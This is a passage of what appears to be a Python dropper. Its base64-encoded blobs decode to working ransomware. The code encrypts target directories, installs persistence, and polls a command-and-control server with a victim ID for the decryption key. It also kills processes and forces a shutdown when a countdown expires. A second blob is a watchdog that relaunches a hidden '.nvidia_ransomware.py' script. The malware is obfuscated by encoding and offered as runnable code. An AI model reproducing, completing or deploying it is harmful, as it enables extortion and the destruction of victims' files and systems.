25kcyBub3cuCiAgICAgICAgICAgICAgICAgICAgZm9yIHByb2MgaW4gYmxhY2tsaXN0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKGYicGtpbGwgLTkgLWYge3Byb2N9ID4vZGV2L251bGwgMj4mMSIpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgIyBJbmNyZWFzZWQgZnJvbSAxLjBzIHRvIDMuMHMgdG8gcmVkdWNlIHN5c3RlbSBsb2FkL3N0dXR0ZXJpbmcKICAgICAgICAgICAgdGltZS5zbGVlcCgzLjApIAoKICAgIGRlZiBjaGFuZ2Vfd2FsbHBhcGVyKHNlbGYpOgogICAgICAgIHBhc3MKCiAgICBkZWYgdHJpZ2dlcl9kb29tc2RheShzZWxmKToKICAgICAgICBpZiBzZWxmLmRvb21zZGF5X3RyaWdnZXJlZDogcmV0dXJuCiAgICAgICAgc2VsZi5kb29tc2RheV90cmlnZ2VyZWQgPSBUcnVlCiAgICAgICAgCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5zcGVha19tZXNzYWdlLCBhcmdzPSgiVGltZSBoYXMgZXhwaXJlZC4gU3lzdGVtIGZhaWx1cmUgaW1taW5lbnQuIiwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHNlbGYubWFzdGVyLmNvbmZpZ3VyZShiZz0nI2ZmMDAwMCcpICMgUkVEIEFMRVJUCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInNodXRkb3duIC9zIC90IDE1IC9jIFwiQ0VSQkVSVVM6IFRJTUUgRVhQSVJFRFwiIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgic2h1dGRvd24gLWggKzEgXCJDRVJCRVJVUzogVElNRSBFWFBJUkVEXCIiKSAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgdXBkYXRlX3RpbWVyKHNlbGYpOgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nIGFuZCBzZWxmLnRpbWVfbGVmdCA+IDA6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgc2VsZi50aW1lX2xlZnQgLT0gMQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgc2VsZi50aW1lX2xlZnQgPD0gMDoKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIHNlbGYudHJpZ2dlcl9kb29tc2RheSkKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIGxhbWJkYTogc2VsZi50aW1lcl9sYWJlbC5jb25maWcodGV4dD0iMDA6MDA6MDAiKSkKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIAogICAgICAgICAgICBtLCBzID0gZGl2bW9kKHNlbGYudGltZV9sZWZ0LCA2MCkKICAgICAgICAgICAgaCwgbSA9IGRpdm1vZChtLCA2MCkKICAgICAgICAgICAgdGltZV9zdHIgPSBmIntoOjAyZH06e206MDJkfTp7czowMmR9IgogICAgICAgICAgICAKICAgICAgICAgICAgIyBUSFJFQUQtU0FGRTogU2NoZWR1bGUgR1VJIHVwZGF0ZSBvbiBtYWluIHRocmVhZAogICAgICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBsYW1iZGEgdHM9dGltZV9zdHI6IHNlbGYuX3VwZGF0ZV90aW1lcl9kaXNwbGF5KHRzKSkKICAgIAogICAgZGVmIF91cGRhdGVfdGltZXJfZGlzcGxheShzZWxmLCB0aW1lX3N0cik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLnRpbWVyX2xhYmVsLmNvbmZpZyh0ZXh0PXRpbWVfc3RyKQogICAgICAgICAgICBpZiBzZWxmLnRpbWVfbGVmdCA8IDM2MDA6CiAgICAgICAgICAgICAgICBzZWxmLnRpbWVyX2xhYmVsLmNvbmZpZyhmZz0nI2ZmMDAwMCcgaWYgc2VsZi50aW1lX2xlZnQgJSAyID09IDAgZWxzZSAnI2ZmZmZmZicpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgogICAgZGVmIGZha2VfZXhmaWx0cmF0aW9uKHNlbGYpOgogICAgICAgIHN0YWdlcyA9IFsgIlNjYW5uaW5nLi4uIiwgIkNvbXByZXNzaW5nLi4uIiwgIkVuY3J5cHRpbmcuLi4iLCAiQ29ubmVjdGluZy4uLiIsICJVcGxvYWRpbmcuLi4iLCAiQ29tcGxldGUuIiBdCiAgICAgICAgZm9yIHN0YWdlIGluIHN0YWdlczoKICAgICAgICAgICAgaWYgbm90IHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOiBicmVhawogICAgICAgICAgICAjIFRIUkVBRC1TQUZFOiBTY2hlZHVsZSBHVUkgdXBkYXRlIG9uIG1haW4gdGhyZWFkCiAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIGxhbWJkYSBzPXN0YWdlOiBzZWxmLmV4ZmlsX3N0YXR1cy5jb25maWcodGV4dD1mIlNUQVRVUzoge3N9IikpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBsYW1iZGE6IHNlbGYuZXhmaWxfc3RhdHVzLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IFVQTE9BRCBDT01QTEVURSIsIGZnPScjZmYwMDAwJykpCgogICAgZGVmIGhlYXJ0YmVhdF9wb2xsaW5nKHNlbGYpOgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmIntDMl9TRVJWRVJfVVJMfS9hcGkvc3RhdHVzL3tzZWxmLnZpY3RpbV9pZH0/dGltZV9sZWZ0PXtzZWxmLnRpbWVfbGVmdH0iLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICAgICAgICAgIGlmICJuZXdfdGltZXIiIGluIGRhdGE6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudGltZV9sZWZ0ID0gaW50KGRhdGFbIm5ld190aW1lciJdKQogICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuZ2V0KCJzdGF0dXMiKSA9PSAicmVhZHkiOgogICAgICAgICAgICAgICAgICAgICAgICBrZXkgPSBkYXRhLmdldCgia2V5IikKICAgICAgICAgICAgICAgICAgICAgICAgaWYga2V5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMCwgc2VsZi51cGRhdGVfa2V5X2ZpZWxkLCBrZXkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZyA9IEZhbHNlCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgdGltZS5zbGVlcCg1KSAKCiAgICBkZWYgdXBkYXRlX2tleV9maWVsZChzZWxmLCBrZXkpOgogICAgICAgIHNlbGYua2V5X3Zhci5zZXQoa2V5KQogICAgICAgIHNlbGYua2V5X2VudHJ5LmNvbmZpZyhzdGF0ZT0nbm9ybWFsJykKICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD0iU1RBVFVTOiBWYWxpZCBrZXkgcmVjZWl2ZWQuIERlY3J5cHRpb24gZW5hYmxlZC4iLCBmZz0nIzRkZmY4OCcpCiAgICAgICAgc2VsZi5kZWNyeXB0X2J1dHRvbi5jb25maWcoc3RhdGU9J25vcm1hbCcpCiAgICAgICAgc2VsZi5rZXlfZW50cnkuY29uZmlnKHN0YXRlPSdyZWFkb25seScpCiAgICAgICAgCiAgICBkZWYgZW5hYmxlX3BheW1lbnRfbW9kZShzZWxmKToKICAgICAgICBzZWxmLnBheW1lbnRfbW9kZV9hY3RpdmUgPSBUcnVlCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9IlNUQVRVUzogQlJPV1NFUiBVTkxPQ0tFRCBGT1IgUEFZTUVOVC4gRE8gTk9UIENMT1NFLiIsIGZnPSdjeWFuJykKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgICBzZWxmLm1hc3Rlci5ncmFiX3JlbGVhc2UoKQogICAgICAgICAgICAgc2VsZi5tYXN0ZXIuYXR0cmlidXRlcygnLXRvcG1vc3QnLCBGYWxzZSkKICAgICAgICAgICAgIHNlbGYubWFzdGVyLm92ZXJyaWRlcmVkaXJlY3QoRmFsc2UpIAogICAgICAgICAgICAgc2VsZi5tYXN0ZXIuaWNvbmlmeSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpbXBvcnQgd2ViYnJvd3NlcgogICAgICAgICAgICB3ZWJicm93c2VyLm9wZW4oImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9Yml0Y29pbitwYXltZW50IikgCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDEyMDAwMCwgc2VsZi5kaXNhYmxlX3BheW1lbnRfbW9kZSkKCiAgICBkZWYgZGlzYWJsZV9wYXltZW50X21vZGUoc2VsZik6CiAgICAgICAgc2VsZi5wYXltZW50X21vZGVfYWN0aXZlID0gRmFsc2UKICAgICAgICBzZWxmLm1hc3Rlci5kZWljb25pZnkoKSAKICAgICAgICBzZWxmLm1hc3Rlci5hdHRyaWJ1dGVzKCctZnVsbHNjcmVlbicsIEZhbHNlKSAjIE5vdCBmdWxsc2NyZWVuIGFueW1vcmUhCiAgICAgICAgc2VsZi5tYXN0ZXIuYXR0cmlidXRlcygnLXRvcG1vc3QnLCBUcnVlKQogICAgICAgIHNlbGYubWFzdGVyLm92ZXJyaWRlcmVkaXJlY3QoRmFsc2UpCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9IlNUQVRVUzogTE9DS0VELiIsIGZnPScjZmZmZjRkJykKCiAgICBkZWYgc3RhcnRfZGVjcnlwdGlvbihzZWxmKToKICAgICAgICBrZXlfYjY0ID0gc2VsZi5rZXlfdmFyLmdldCgpCiAgICAgICAgaWYgbm90IGtleV9iNjQ6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIAogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IERlY3J5cHRpbmcgZmlsZXMuLi4gUGxlYXNlIHdhaXQuIiwgZmc9J3llbGxvdycpCiAgICAgICAgc2VsZi5tYXN0ZXIudXBkYXRlKCkKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIGtleSA9IGJhc2U2NC5iNjRkZWNvZGUoa2V5X2I2NCkKICAgICAgICAgICAgZGVjcnlwdGVkX2ZpbGVzID0gMAogICAgICAgICAgICAKICAgICAgICAgICAgIyBMb2FkIHNhdmVkIGVuY3J5cHRlZCBwYXRocyAocHJlZmVyIHRoaXMgb3ZlciBkZWZhdWx0KQogICAgICAgICAgICB0YXJnZXRfcGF0aHMgPSBbVEFSR0VUX0RJUkVDVE9SWV0gICMgRGVmYXVsdCBmYWxsYmFjawogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhFTkNSWVBURURfUEFUSFNfRklMRSk6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKEVOQ1JZUFRFRF9QQVRIU19GSUxFLCAncicpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldF9wYXRocyA9IGpzb24ubG9hZChmKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgICMgRGVjcnlwdCBBTEwgZW5jcnlwdGVkIGRpcmVjdG9yaWVzCiAgICAgICAgICAgIGZvciB0YXJnZXRfcGF0aCBpbiB0YXJnZXRfcGF0aHM6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh0YXJnZXRfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsodGFyZ2V0X3BhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoRU5DUllQVEVEX0VYVEVOU0lPTik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGVjcnlwdF9maWxlX2Flc19nY20oZmlsZV9wYXRoLCBrZXkpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfZmlsZXMgKz0gMQogICAgICAgICAgICAKICAgICAgICAgICAgIyAtLS0gQ0xFQU4gVVAgLS0tCiAgICAgICAgICAgIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nID0gRmFsc2UgIyBTdG9wIGFsbCBiYWNrZ3JvdW5kIHRocmVhZHMKICAgICAgICAgICAgCiAgICAgICAgICAgICMgMS4gQ3JlYXRlIFNUT1AgU0lHTkFMIGZvciB3YXRjaGRvZyAoTVVTVCBiZSBpbiB0ZW1wIGRpciwgbm90IGNvbmZpZyBkaXIhKQogICAgICAgICAgICBpbXBvcnQgdGVtcGZpbGUKICAgICAgICAgICAgc3RvcF9zaWduYWxfcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICJjZXJiZXJ1c19zdG9wX3NpZ25hbCIpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihzdG9wX3NpZ25hbF9wYXRoLCAndycpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgiREVDUllQVElPTl9DT01QTEVURSIpCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICAKICAgICAgICAgICAgIyAyLiBSZW1vdmUgUGVyc2lzdGVuY2UKICAgICAgICAgICAgcmVtb3ZlX3BlcnNpc3RlbmNlKCkKICAgICAgICAgICAgCiAgICAgICAgICAgICMgMy4gTWFyayBhcyBDbGVhbiAobGVnYWN5LCBrZXB0IGZvciBjb21wYXRpYmlsaXR5KQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKENMRUFOX01BUktFUiwgJ3cnKSBhcyBmOiBmLndyaXRlKCJGcmVlZCIpCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwoKICAgICAgICAgICAgIyA0LiBOdWtlIENvbmZpZyBEaXJlY3RvcnkKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoQ09ORklHX0RJUik6CiAgICAgICAgICAgICAgICB0cnk6IHNodXRpbC5ybXRyZWUoQ09ORklHX0RJUikKICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICAKICAgICAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9ZiJTVUNDRVNTISB7ZGVjcnlwdGVkX2ZpbGVzfSBmaWxlcyBkZWNyeXB0ZWQuIFN5c3RlbSBDbGVhbmVkLiIsIGZnPScjNGRmZjg4JykKICAgICAgICAgICAgbWVzc2FnZWJveC5zaG93aW5mbygiRGVjcnlwdGlvbiBDb21wbGV0ZSIsICJZb3VyIGZpbGVzIGhhdmUgYmVlbiByZXN0b3JlZCBhbmQgdGhlIHJhbnNvbXdhcmUgcmVtb3ZlZC5cbkV4aXRpbmcgbm93LiIpCiAgICAgICAgICAgIAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgbG9nX2Vycm9yKGYiRGVjcnlwdGlvbiBmYWlsZWQ6IHtlfSIpCiAgICAgICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PSJFUlJPUjogRGVjcnlwdGlvbiBmYWlsZWQuIiwgZmc9J3JlZCcpCiAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd2Vycm9yKCJFcnJvciIsIGYiRGVjcnlwdGlvbiBmYWlsZWQ6IHtlfSIpCiAgICAgICAgCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgIyBGT1JDRSBFWElUIE5PIE1BVFRFUiBXSEFUCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmdyYWJfcmVsZWFzZSgpIAogICAgICAgICAgICAgICAgc2VsZi5tYXN0ZXIuZGVzdHJveSgpIAogICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgb3MuX2V4aXQoMCkgIyBIYXJkIGV4aXQgdG8ga2lsbCBhbGwgdGhyZWFkcwoKIyAtLS0gTWFpbiBFeGVjdXRpb24gLS0tCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBpZiBvcy5wYXRoLmV4aXN0cyhDTEVBTl9NQVJLRVIpOgogICAgICAgICMgQWxyZWFkeSBjbGVhbmVkIHVwIC0gZXhpdAogICAgICAgIHN5cy5leGl0KDApCiAgICAKICAgICMgMC4gUGVyc2lzdGVuY2UgSW5zdGFsbGF0aW9uCiAgICBpbnN0YWxsX3BlcnNpc3RlbmNlKCkKCiAgICBoaWRlX2NvbnNvbGUoKQoKICAgICMgUEVSU0lTVEVOQ0UgQ0hFQ0stSU4gKFJlc3RvcmluZyBhZnRlciByZWJvb3QpCiAgICAjIElmIElEIGZpbGUgZXhpc3RzLCB3ZSBhbHJlYWR5IGVuY3J5cHRlZCAtIGp1c3Qgc2hvdyBHVUkKICAgIGlmIG9zLnBhdGguZXhpc3RzKElEX0ZJTEUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKElEX0ZJTEUsICdyJykgYXMgZjoKICAgICAgICAgICAgICAgIHZpY3RpbV9pZCA9IGYucmVhZCgpLnN0cmlwKCkKICAgICAgICAgICAgaWYgdmljdGltX2lkOgogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiUmVzdW1pbmcgc2Vzc2lvbiBmb3IgVmljdGltIElEOiB7dmljdGltX2lkfSIpCiAgICAgICAgICAgICAgICByb290ID0gVGsoKQogICAgICAgICAgICAgICAgYXBwID0gUmFuc29td2FyZUdVSShyb290LCB2aWN0aW1faWQpCiAgICAgICAgICAgICAgICByb290Lm1haW5sb29wKCkKICAgICAgICAgICAgICAgIHN5cy5leGl0KCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MgCiAgICAKICAgICMgTkVXIElORkVDVElPTiBGTE9XCiAgICAjIFN0ZXAgMTogVHJ5IHRvIGdldCB0YXJnZXQgc2VsZWN0aW9uIGZyb20gQzIKICAgIGxvZ19lcnJvcigiU3RhcnRpbmcgbmV3IGluZmVjdGlvbiAtIGF0dGVtcHRpbmcgdGFyZ2V0IHNlbGVjdGlvbi4uLiIpCiAgICBzZWxlY3RlZF90YXJnZXRzID0gc2Nhbl9hbmRfd2FpdF9mb3JfaW5zdHJ1Y3Rpb25zKCkKICAgIAogICAgIyBTdGVwIDI6IEVuY3J5cHQgKHNlbGVjdGVkIHRhcmdldHMgT1IgZGVmYXVsdCBpZiBDMiB1bnJlYWNoYWJsZSkKICAgIGlmIHNlbGVjdGVkX3RhcmdldHM6CiAgICAgICAgbG9nX2Vycm9yKGYiQzIgc2VsZWN0ZWQge2xlbihzZWxlY3RlZF90YXJnZXRzKX0gdGFyZ2V0cyIpCiAgICAgICAgYWVzX2tleSA9IGVuY3J5cHRfZGlyZWN0b3J5KHNlbGVjdGVkX3RhcmdldHMpCiAgICBlbHNlOgogICAgICAgIGxvZ19lcnJvcigiQzIgdW5yZWFjaGFibGUgb3IgdGltZWQgb3V0IC0gdXNpbmcgZGVmYXVsdCB0YXJnZXQiKQogICAgICAgIGFlc19rZXkgPSBlbmNyeXB0X2RpcmVjdG9yeSgpICAjIEZhbGxzIGJhY2sgdG8gVEFSR0VUX0RJUkVDVE9SWQogICAgCiAgICAjIFN0ZXAgMzogQ2hlY2sgaW4gYW5kIGxhdW5jaCBHVUkKICAgIGlmIGFlc19rZXk6CiAgICAgICAgdmljdGltX2lkID0gY2hlY2tfaW5fd2l0aF9jMihhZXNfa2V5KQogICAgICAgIGlmIHZpY3RpbV9pZDoKICAgICAgICAgICAgcm9vdCA9IFRrKCkKICAgICAgICAgICAgYXBwID0gUmFuc29td2FyZUdVSShyb290LCB2aWN0aW1faWQpCiAgICAgICAgICAgIHJvb3QubWFpbmxvb3AoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGxvZ19lcnJvcigiRmFpbGVkIHRvIGdldCBWaWN0aW0gSUQuIEFib3J0aW5nIEdVSS4iKQogICAgZWxzZToKICAgICAgICBsb2dfZXJyb3IoIkVuY3J5cHRpb24gc2tpcHBlZCBvciBmYWlsZWQuIEFib3J0aW5nLiIpCgo="
WATCHDOG_B64 = "IyB3YXRjaGRvZy5weSAtIEF1dG8tcmVzdGFydCBtb25pdG9yIGZvciByYW5zb213YXJlDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCB0aW1lDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHRlbXBmaWxlDQppbXBvcnQgcHN1dGlsDQoNCiMgQ29uZmlndXJhdGlvbg0KUkFOU09NV0FSRV9TQ1JJUFQgPSAiLm52aWRpYV9yYW5zb213YXJlLnB5IiAgIyBGaWxlbmFtZSBvbmx5LCB3aWxsIGJlIGluIHNhbWUgZGlyIGFzIHdhdGNoZG9nDQpDSEVDS19JTlRFUlZBTCA9IDUgICMgQ2hlY2sgZXZlcnkgNSBzZWNvbmRzDQpTVE9QX1NJR05BTF9GSUxFID0gb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImNlcmJlcnVzX3N0b3Bfc2lnbmFsIikNCg0KZGVmIGlzX3JhbnNvbXdhcmVfcnVubmluZygpOg0KICAgICIiIkNoZWNrIGlmIHJhbnNvbXdhcmUgcHJvY2VzcyBpcyBydW5uaW5nLiIiIg0KICAgIHRyeToNCiAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcihbJ3BpZCcsICduYW1lJywgJ2NtZGxpbmUnXSk6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgY21kbGluZSA9IHByb2MuaW5mby5nZXQoJ2NtZGxpbmUnKQ0KICAgICAgICAgICAgICAgIGlmIGNtZGxpbmUgYW5kIGFueShSQU5TT01XQVJFX1NDUklQVCBpbiBzdHIoYXJnKSBmb3IgYXJnIGluIGNtZGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgICAgICAgICAgZXhjZXB0IChwc3V0aWwuTm9TdWNoUHJvY2VzcywgcHN1dGlsLkFjY2Vzc0RlbmllZCk6DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCmRlZiBzdGFydF9yYW5zb213YXJlKCk6DQogICAgIiIiU3RhcnQgdGhlIHJhbnNvbXdhcmUgcHJvY2VzcyB3aXRoIHZpc2libGUgR1VJLiIiIg0KICAgIHRyeToNCiAgICAgICAgd2F0Y2hkb2dfZGlyID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpDQogICAgICAgIHJhbnNvbXdhcmVfcGF0aCA9IG9zLnBhdGguam9pbih3YXRjaGRvZ19kaXIsIFJBTlNPTVdBUkVfU0NSSVBUKQ0KICAgICAgICANCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHJhbnNvbXdhcmVfcGF0aCk6DQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCiAgICAgICAgICAgIA0KICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgICAgICAjIFdpbmRvd3M6IFJ1biB3aXRoIHZpc2libGUgR1VJIChubyBoaWRkZW4gZmxhZ3MhKQ0KICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3Blbihbc3lzLmV4ZWN1dGFibGUsIHJhbnNvbXdhcmVfcGF0aF0pDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAjIExpbnV4OiBSdW4gaW4gYmFja2dyb3VuZA0KICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3Blbihbc3lzLmV4ZWN1dGFibGUsIHJhbnNvbXdhcmVfcGF0aF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkNCiAgICAgICAgcmV0dXJuIFRydWUNCiAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KZGVmIHNob3VsZF9zdG9wKCk6DQogICAgIiIiQ2hlY2sgaWYgc3RvcCBzaWduYWwgZXhpc3RzLiIiIg0KICAgIHJldHVybiBvcy5wYXRoLmV4aXN0cyhTVE9QX1NJR05BTF9GSUxFKQ0KDQpkZWYgY2xlYW51cF9hbmRfZXhpdCgpOg0KICAgICIiIkRlbGV0ZSB3YXRjaGRvZywgcmFuc29td2FyZSBmaWxlcywgYW5kIHRoZSBzdG9wIHNpZ25hbC4iIiINCiAgICB0cnk6DQogICAgICAgIHdhdGNoZG9nX2RpciA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQ0KICAgICAgICByYW5zb213YXJlX3BhdGggPSBvcy5wYXRoLmpvaW4od2F0Y2hkb2dfZGlyLCBSQU5TT01XQVJFX1NDUklQVCkNCiAgICAgICAgd2F0Y2hkb2dfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykNCiAgICAgICAgDQogICAgICAgICMgUmVtb3ZlIHN0b3Agc2lnbmFsDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKFNUT1BfU0lHTkFMX0ZJTEUpOg0KICAgICAgICAgICAgdHJ5OiBvcy5yZW1vdmUoU1RPUF9TSUdOQUxfRklMRSkNCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICANCiAgICAgICAgIyBEZWxldGUgcmFuc29td2FyZSBmaWxlDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHJhbnNvbXdhcmVfcGF0aCk6DQogICAgICAgICAgICB0cnk6IG9zLnJlbW92ZShyYW5zb213YXJlX3BhdGgpDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgDQogICAgICAgICMgRGVsZXRlIHdhdGNoZG9nIGZpbGUgKHNlbGYtZGVsZXRlKQ0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh3YXRjaGRvZ19wYXRoKToNCiAgICAgICAgICAgIHRyeTogb3MucmVtb3ZlKHdhdGNoZG9nX3BhdGgpDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCg0KZGVmIG1haW4oKToNCiAgICAiIiJNYWluIHdhdGNoZG9nIGxvb3Agd2l0aCBwcm9wZXIgc2lnbmFsIGNoZWNraW5nLiIiIg0KICAgIA0KICAgICMgU1RFUCAxOiBDaGVjayBmb3IgbGVmdG92ZXIgc3RvcCBzaWduYWwgKGZyb20gcHJldmlvdXMgcnVuKQ0KICAgIGlmIHNob3VsZF9zdG9wKCk6DQogICAgICAgIGNsZWFudXBfYW5kX2V4aXQoKQ0KICAgICAgICByZXR1cm4NCiAgICANCiAgICAjIFNURVAgMjogU3RhcnQgcmFuc29td2FyZSBpZiBub3QgcnVubmluZw0KICAgIGlmIG5vdCBpc19yYW5zb213YXJlX3J1bm5pbmcoKToNCiAgICAgICAgc3RhcnRfcmFuc29td2FyZSgpDQogICAgICAgIHRpbWUuc2xlZXAoMykgICMgR2l2ZSBpdCB0aW1lIHRvIHN0YXJ0DQogICAgDQogICAgIyBTVEVQIDM6IE1vbml0b3IgbG9vcA0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICMgQUxXQVlTIGNoZWNrIHN0b3Agc2lnbmFsIEZJUlNUIGJlZm9yZSBBTlkgYWN0aW9uDQogICAgICAgICAgICBpZiBzaG91bGRfc3RvcCgpOg0KICAgICAgICAgICAgICAgIGNsZWFudXBfYW5kX2V4aXQoKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICANCiAgICAgICAgICAgICMgT25seSByZXN0YXJ0IGlmI